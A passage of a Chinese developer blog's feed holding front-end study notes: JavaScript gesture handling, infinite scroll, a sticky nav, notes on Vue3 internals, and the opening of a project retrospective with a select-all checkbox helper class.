class="line">      onStart(e, contexts[MOUSE_TYPE]);</span><br><span class="line">      <span class="keyword">let</span> move = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        onMove(e, contexts[MOUSE_TYPE]);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">let</span> end = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        onEnd(e, contexts[MOUSE_TYPE]);</span><br><span class="line">        <span class="built_in">document</span>.removeEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span><br><span class="line">      <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mouseup&quot;</span>, end, &#123; <span class="attr">once</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchstart&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 移动端通过 touch.identifier 标识触发事件的是哪一根手指</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      contexts[touch.identifier] = &#123;&#125;;</span><br><span class="line">      onStart(touch, contexts[touch.identifier]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchmove&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      onMove(touch, contexts[touch.identifier]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchend&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      onEnd(touch, contexts[touch.identifier]);</span><br><span class="line">      <span class="keyword">delete</span> contexts[touch.identifier];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> onStart = <span class="function">(<span class="params">e, contexts</span>) =&gt;</span> &#123;</span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;start&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">    contexts.startX = e.clientX;</span><br><span class="line">    contexts.startY = e.clientY;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> onMove = <span class="function">(<span class="params">e, contexts</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> dx = e.clientX - contexts.startX;</span><br><span class="line">    <span class="keyword">let</span> dy = e.clientY - contexts.startY;</span><br><span class="line">    <span class="comment">// 判断是否发生 pan 滑屏</span></span><br><span class="line">    <span class="keyword">if</span> (dx ** <span class="number">2</span> + dy ** <span class="number">2</span> &gt; <span class="number">100</span> &amp;&amp; !contexts.isPan) &#123;</span><br><span class="line">      contexts.isPan = <span class="literal">true</span>;</span><br><span class="line">      ele.dispatchEvent(</span><br><span class="line">        <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;panstart&quot;</span>), &#123;</span><br><span class="line">          <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">          <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">          <span class="attr">startX</span>: contexts.startX,</span><br><span class="line">          <span class="attr">startY</span>: contexts.startY,</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (contexts.isPan) &#123;</span><br><span class="line">      ele.dispatchEvent(</span><br><span class="line">        <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;pan&quot;</span>), &#123;</span><br><span class="line">          <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">          <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">          <span class="attr">startX</span>: contexts.startX,</span><br><span class="line">          <span class="attr">startY</span>: contexts.startY,</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;move&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> onEnd = <span class="function">(<span class="params">e, contexts</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (contexts.isPan) &#123;</span><br><span class="line">      ele.dispatchEvent(</span><br><span class="line">        <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;panend&quot;</span>), &#123;</span><br><span class="line">          <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">          <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">          <span class="attr">startX</span>: contexts.startX,</span><br><span class="line">          <span class="attr">startY</span>: contexts.startY,</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">      contexts.isPan = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;start&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>pressstart、presscancel（长按时滑屏）、pressend（长按）tap（点击）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enableGesture</span>(<span class="params">ele</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 通过 contexts 标识类型以及其他</span></span><br><span class="line">  <span class="keyword">let</span> contexts = &#123;&#125;;</span><br><span class="line">  <span class="keyword">const</span> MOUSE_TYPE = <span class="built_in">Symbol</span>(<span class="string">&quot;mouse&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// PC 端</span></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="string">&quot;ontouchstart&quot;</span> <span class="keyword">in</span> <span class="built_in">document</span>)) &#123;</span><br><span class="line">    ele.addEventListener(<span class="string">&quot;mousedown&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      contexts[MOUSE_TYPE] = &#123;&#125;;</span><br><span class="line">      onStart(e, contexts[MOUSE_TYPE]);</span><br><span class="line">      <span class="keyword">let</span> move = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        onMove(e, contexts[MOUSE_TYPE]);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">let</span> end = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        onEnd(e, contexts[MOUSE_TYPE]);</span><br><span class="line">        <span class="built_in">document</span>.removeEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span><br><span class="line">      <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mouseup&quot;</span>, end, &#123; <span class="attr">once</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchstart&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 移动端通过 touch.identifier 标识触发事件的是哪一根手指</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      contexts[touch.identifier] = &#123;&#125;;</span><br><span class="line">      onStart(touch, contexts[touch.identifier]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchmove&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      onMove(touch, contexts[touch.identifier]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchend&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      onEnd(touch, contexts[touch.identifier]);</span><br><span class="line">      <span class="keyword">delete</span> contexts[touch.identifier];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> onStart = <span class="function">(<span class="params">e, contexts</span>) =&gt;</span> &#123;</span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;start&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 按下时默认想 tap</span></span><br><span class="line">    contexts.isTap = <span class="literal">true</span>;</span><br><span class="line">    contexts.startX = e.clientX;</span><br><span class="line">    contexts.startY = e.clientY;</span><br><span class="line">    <span class="built_in">clearTimeout</span>(contexts.timeout);</span><br><span class="line">    <span class="comment">// 500ms 后想长按</span></span><br><span class="line">    contexts.timeout = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      contexts.isTap = <span class="literal">false</span>;</span><br><span class="line">      <span class="comment">// 长按</span></span><br><span class="line">      contexts.isPress = <span class="literal">true</span>;</span><br><span class="line">      ele.dispatchEvent(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;pressstart&quot;</span>));</span><br><span class="line">    &#125;, <span class="number">500</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> onMove = <span class="function">(<span class="params">e, contexts</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> dx = e.clientX - contexts.startX;</span><br><span class="line">    <span class="keyword">let</span> dy = e.clientY - contexts.startY;</span><br><span class="line"></span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;move&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发生 pan 滑屏</span></span><br><span class="line">    <span class="keyword">if</span> (dx ** <span class="number">2</span> + dy ** <span class="number">2</span> &gt; <span class="number">100</span> &amp;&amp; !contexts.isPan) &#123;</span><br><span class="line">      contexts.isPan = <span class="literal">true</span>;</span><br><span class="line">      <span class="comment">// 如果是长按</span></span><br><span class="line">      <span class="keyword">if</span> (contexts.isPress) &#123;</span><br><span class="line">        ele.dispatchEvent(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;presscancel&quot;</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 发生滑屏后就不是长按</span></span><br><span class="line">      <span class="built_in">clearTimeout</span>(contexts.timeout);</span><br><span class="line">      contexts.isTap = <span class="literal">false</span>;</span><br><span class="line">      contexts.isPress = <span class="literal">false</span>;</span><br><span class="line">      ele.dispatchEvent(</span><br><span class="line">        <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;panstart&quot;</span>), &#123;</span><br><span class="line">          <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">          <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">          <span class="attr">startX</span>: contexts.startX,</span><br><span class="line">          <span class="attr">startY</span>: contexts.startY,</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">      <span class="comment">// 防止同时执行</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (contexts.isPan) &#123;</span><br><span class="line">      ele.dispatchEvent(</span><br><span class="line">        <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;pan&quot;</span>), &#123;</span><br><span class="line">          <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">          <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">          <span class="attr">startX</span>: contexts.startX,</span><br><span class="line">          <span class="attr">startY</span>: contexts.startY,</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> onEnd = <span class="function">(<span class="params">e, contexts</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">clearTimeout</span>(contexts.timeout);</span><br><span class="line">    <span class="keyword">if</span> (contexts.isPan) &#123;</span><br><span class="line">      ele.dispatchEvent(</span><br><span class="line">        <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;panend&quot;</span>), &#123;</span><br><span class="line">          <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">          <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">          <span class="attr">startX</span>: contexts.startX,</span><br><span class="line">          <span class="attr">startY</span>: contexts.startY,</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">      contexts.isPan = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (contexts.isTap) &#123;</span><br><span class="line">      ele.dispatchEvent(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;tap&quot;</span>));</span><br><span class="line">      contexts.isTap = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (contexts.isPress) &#123;</span><br><span class="line">      ele.dispatchEvent(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;pressend&quot;</span>));</span><br><span class="line">      contexts.isPress = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;start&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="四、移动端实战（轮播图）"><a href="#四、移动端实战（轮播图）" class="headerlink" title="四、移动端实战（轮播图）"></a>四、移动端实战（轮播图）</h2><p>见 <a href="https://github.com/Asura1211/YouthCamp/blob/lcj/day4/12-%E5%B9%BB%E7%81%AF%E7%89%87.html">github 地址</a>（思路真的很好！） 还有<a href="https://learn.kaikeba.com/video/464299">回放录屏</a>。</p><h2 id="五、移动端实战（商城首页）"><a href="#五、移动端实战（商城首页）" class="headerlink" title="五、移动端实战（商城首页）"></a>五、移动端实战（商城首页）</h2><h3 id="无限列表"><a href="#无限列表" class="headerlink" title="无限列表"></a>无限列表</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onscroll = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 当前滚轮高度( chrome 中 scrollTop 需区别对待)</span></span><br><span class="line">    <span class="keyword">let</span> scrollTop = <span class="built_in">document</span>.body.scrollTop || <span class="built_in">document</span>.documentElement.scrollTop;</span><br><span class="line">    <span class="comment">// 当前可视区域的高度</span></span><br><span class="line">    <span class="keyword">let</span> viewHeight = <span class="built_in">document</span>.documentElement.clientHeight;</span><br><span class="line">    <span class="comment">// 页面总高度</span></span><br><span class="line">    <span class="keyword">let</span> scrollHeight = <span class="built_in">document</span>.body.scrollHeight</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(scrollHeight-scrollTop&lt;=viewHeight)&#123;</span><br><span class="line">        <span class="comment">// 到达底部</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="吸顶"><a href="#吸顶" class="headerlink" title="吸顶"></a>吸顶</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> targetNav, offsetTop;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    targetNav = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.yellow&#x27;</span>);</span><br><span class="line">    offsetTop = targetNav.offsetTop</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.onscroll = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 当前滚轮高度</span></span><br><span class="line">    <span class="keyword">let</span> scrollTop = <span class="built_in">document</span>.body.scrollTop || <span class="built_in">document</span>.documentElement.scrollTop;</span><br><span class="line">    <span class="comment">// 当前可视区域的高度</span></span><br><span class="line">    <span class="keyword">let</span> viewHeight = <span class="built_in">document</span>.documentElement.clientHeight;</span><br><span class="line">    <span class="comment">// 页面总高度</span></span><br><span class="line">    <span class="keyword">let</span> scrollHeight = <span class="built_in">document</span>.body.scrollHeight</span><br><span class="line">    <span class="keyword">if</span> (scrollTop &gt; offsetTop) &#123;</span><br><span class="line">        targetNav.style.position = <span class="string">&quot;fixed&quot;</span>;</span><br><span class="line">        targetNav.style.top = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        targetNav.nextElementSibling.style.marginTop = targetNav.offsetHeight + <span class="string">&#x27;px&#x27;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        targetNav.style.position = <span class="string">&quot;relative&quot;</span>;</span><br><span class="line">        targetNav.nextElementSibling.style.marginTop = <span class="string">&#x27;0px&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="浏览进度"><a href="#浏览进度" class="headerlink" title="浏览进度"></a>浏览进度</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;nav blue &quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:80vw; height:1vw; position:absolute; left:50%; top: 50%; transform: translate(-50%,-50%);background-color: #fff;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;progressbar&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 10%;height: 100%;background-color: black;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&quot;#progressbar&quot;</span>).style.width = <span class="built_in">Math</span>.min(scrollTop / (scrollHeight - viewHeight * <span class="number">1.7</span>) * <span class="number">100</span>, <span class="number">100</span>) + <span class="string">&quot;%&quot;</span></span><br></pre></td></tr></table></figure><h1 id="9-24-Vue3"><a href="#9-24-Vue3" class="headerlink" title="9.24 Vue3"></a>9.24 Vue3</h1><h2 id="设计理念"><a href="#设计理念" class="headerlink" title="设计理念"></a>设计理念</h2><ul><li>易上手</li><li>数据驱动 （减少 dom 操作）：声明式渲染，vdom，patch</li><li>渐进式（progressive）：min、vuex、router…</li><li>设计动机<ul><li>用函数的方式创建：类型支持，消灭 this。（函数：vue3、react；class：vue2、Angular）</li><li>实例方法和属性（tree-shaking）：消灭 dead code。比如 <code>Vue.component(&#39;comp&#39;,&#123;&#125;)</code>。</li><li>复用性、可读性、可维护性：数据和控制数据的业务写在一起，可以封成一个 hook。</li><li>API 简化：一致性；简化，删除一些相同功能的 API（比如 v-model 与 .sync），还有 render。</li><li>扩展性：自定义渲染器， <code>Vue.createRenderer()</code></li><li>性能优化：响应式，基于 Proxy。<ul><li>vue2 <code>Object.defineProperty(obj,&#123;&#125;)</code> 基于递归，效率问题</li><li>数组无法用 defineProperty，只能单独实现</li><li>api 影响，动态属性的新增删除 Vue.delete/set</li><li>class map set 等的支持问题</li><li><strong>但是 Proxy 的兼容性很差</strong>（IE11也无法支持）</li></ul></li></ul></li></ul><p>setup 优先级高于 data。当两者中有属性重复时，显示 setup 的。</p><h2 id="源码学习"><a href="#源码学习" class="headerlink" title="源码学习"></a>源码学习</h2><h3 id="mini-vue"><a href="#mini-vue" class="headerlink" title="mini-vue"></a>mini-vue</h3><h4 id="01-02-初始化"><a href="#01-02-初始化" class="headerlink" title="01 02-初始化"></a>01 02-初始化</h4><p>见 <a href="https://github.com/Asura1211/YouthCamp/tree/main/day5/design%E3%80%82">https://github.com/Asura1211/YouthCamp/tree/main/day5/design。</a></p><p>（原来真的没有想的那么难呀）</p><h4 id="03-响应式"><a href="#03-响应式" class="headerlink" title="03-响应式"></a>03-响应式</h4><p>reactive 时与app解耦流程图：</p><p><img src="https://i.loli.net/2021/10/05/iXpdeCbsWRVvHUO.png" alt="image.png"></p><p>注意点：</p><ul><li>使用 effectStack（数组）保存 effect 函数，是因为副作用函数 effect 可能嵌套调用</li><li>effect 中的 cb 函数只要访问到响应式数据，就一定会触发 Proxy 中的 get 函数，从而触发 track。然后与 effectStack 建立映射关系</li><li>当用户修改响应式数据时，触发 set 函数，从而触发 trigger。</li></ul><h4 id="04-05-更新"><a href="#04-05-更新" class="headerlink" title="04 05-更新"></a>04 05-更新</h4><p>虚拟 dom（vnode）：vnode是什么？</p><ul><li><p>js object，为了描述视图</p></li><li><p>减少 dom 操作</p></li><li><p>高效更新</p></li></ul><p>diff patch：通过比较已存在的 vnode，最大限度的复用已存在的 dom 节点，最终可以最小化 dom 操作。</p><p>性能：</p><ul><li>同层比较，深度优先（时间复杂度较低）</li><li>编译阶段进行优化（vue-loader）</li></ul><h4 id="06-更新子元素（前数组后数组）"><a href="#06-更新子元素（前数组后数组）" class="headerlink" title="06-更新子元素（前数组后数组）"></a>06-更新子元素（前数组后数组）</h4><p>比较方法：首首尾尾比较（双端比较），新数组有剩下就批量创建，老数组有剩下就批量删除</p><h2 id="SFC原理"><a href="#SFC原理" class="headerlink" title="SFC原理"></a>SFC原理</h2><p>单文件组件 .vue</p><p>原理：vue-loader 解析 SFC 为 js 对象（组件配置对象），对 .vue 文件中的 template -&gt; render 函数</p><p>babel-loader 解析 script 代码以及 .js 文件</p><p>css-loader 解析 style 代码为 css 代码，vue-style-loader 将 css 代码追加到宿主页面。（不同的 lang 需要配不同的 loader）</p><h2 id="JSX原理"><a href="#JSX原理" class="headerlink" title="JSX原理"></a>JSX原理</h2><ul><li>babel-loader</li><li>@vue/babel-plugin-vue</li></ul><h2 id="组件化"><a href="#组件化" class="headerlink" title="组件化"></a>组件化</h2><h3 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h3><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>minxins</p><p>composition</p><p>slots</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HTML&quot;&gt;&lt;a href=&quot;#HTML&quot; class=&quot;headerlink&quot; title=&quot;HTML&quot;&gt;&lt;/a&gt;HTML&lt;/h1&gt;&lt;h1 id=&quot;CSS&quot;&gt;&lt;a href=&quot;#CSS&quot; class=&quot;headerlink&quot; title=&quot;CSS&quot;&gt;&lt;/a&gt;CS</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://asura1211.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>【项目复盘】— — 贤得家e社区学堂管理系统</title>
    <link href="https://asura1211.github.io/2021/07/16/%E3%80%90%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98%E3%80%91%E2%80%94%20%E2%80%94%20%E8%B4%A4%E5%BE%97%E5%AE%B6%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%A6%E5%A0%82%E6%A8%A1%E5%9D%97/"/>
    <id>https://asura1211.github.io/2021/07/16/%E3%80%90%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98%E3%80%91%E2%80%94%20%E2%80%94%20%E8%B4%A4%E5%BE%97%E5%AE%B6%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%A6%E5%A0%82%E6%A8%A1%E5%9D%97/</id>
    <published>2021-07-16T19:55:25.000Z</published>
    <updated>2021-11-24T06:25:54.451Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是我对实验室校企合作项目——“贤得家e社区学堂管理系统”的复盘总结。项目接手时间大概在2020年12月底，寒假拖拖拉拉了挺久，最后于2021年3月解决所有bug。</p><h1 id="项目简介"><a href="#项目简介" class="headerlink" title="项目简介"></a>项目简介</h1><p>该系统主要是为智慧社区居民提供学堂服务，后台的管理平台是为管理者管理学堂信息服务，共分为课程、教师、课表和学员风采四个模块。项目基于 Vue 的单页应用开发模式进行开发。</p><h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><h2 id="一、函数封装"><a href="#一、函数封装" class="headerlink" title="一、函数封装"></a>一、函数封装</h2><ol><li>由于三个模块都需要实现单选全选的功能，因此将多选框这些功能写在一个js文件，放入utils文件夹统一管理。</li><li>各模块几乎都需要对后台返回的时间戳进行处理，因此把所有有关功能写在js文件。</li></ol><h2 id="实现方案"><a href="#实现方案" class="headerlink" title="实现方案"></a>实现方案</h2><ol><li><p>在src&gt;utils中创建selectAllController.js文件，定义一个SelectAllController类：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SelectAllController</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">checkItemName, checkAllId</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.checkItemName = checkItemName; <span class="comment">//单选checkbox的name值</span></span><br><span class="line">        <span class="built_in">this</span>.checkAllId = checkAllId; <span class="comment">//全选checkbox的id值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">checkItem</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> self = <span class="built_in">this</span>;</span><br><span class="line">        <span class="keyword">let</span> checkAllInput = <span class="built_in">document</span>.getElementById(self.checkAllId);</span><br><span class="line">        <span class="keyword">let</span> checkItems = <span class="built_in">document</span>.getElementsByName(self.checkItemName);</span><br><span class="line">        <span class="keyword">let</span> checkedItemNum = <span class="number">0</span>;</span><br><span class="line">        checkItems.forEach(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (element.checked) &#123;</span><br><span class="line">                checkedItemNum++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">if</span> (checkedItemNum == checkItems.length) &#123;</span><br><span class="line">            checkAllInput.checked = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            checkAllInput.checked = <span class="literal">false</span>;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">checkAll</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> self = <span class="built_in">this</span>;</span><br><span class="line">        <span class="keyword">let</span> checkAllInput = <span class="built_in">document</span>.getElementById(self.checkAllId);</span><br><span class="line">        <span class="keyword">let</span> checkItems = <span class="built_in">document</span>.getElementsByName(self.checkItemName);</span><br><span class="line">        <span class="keyword">if</span> (checkAllInput.checked == <span class="literal">true</span>) &#123;</span><br><span class="line">            checkItems.forEach(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">                element.checked = <span class="literal">true</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            checkItems.forEach(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span 